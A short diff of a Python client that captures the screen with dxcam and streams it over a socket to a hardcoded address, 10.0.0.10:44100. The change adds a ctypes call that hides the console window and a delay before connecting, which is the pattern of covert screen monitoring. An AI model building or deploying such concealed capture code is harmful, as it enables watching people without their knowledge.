@@ -4,7 +4,7 @@ import threading
 import pickle
 import socket
 import time
-
+import ctypes
 import client_global_flags_a
 import dxcam
 import lz4.frame
@@ -46,14 +46,22 @@ def start_stream(camera_cam, s_socket):
                 pass
 
 
-# before compiling uncomment these lines
 '''if sys.argv[-1] != 'hidden':
     subprocess.Popen([sys.executable] + sys.argv + ['hidden'],
                      creationflags=subprocess.CREATE_NO_WINDOW)
 
 
-else:
-    time.sleep(15)'''
+else:'''
+
+SW_HIDE = 0
+
+
+def hide_console():
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), SW_HIDE)
+
+
+hide_console()
+time.sleep(15)
 
 my_socket = socket.socket()
 my_socket.connect(("10.0.0.10", 44100))
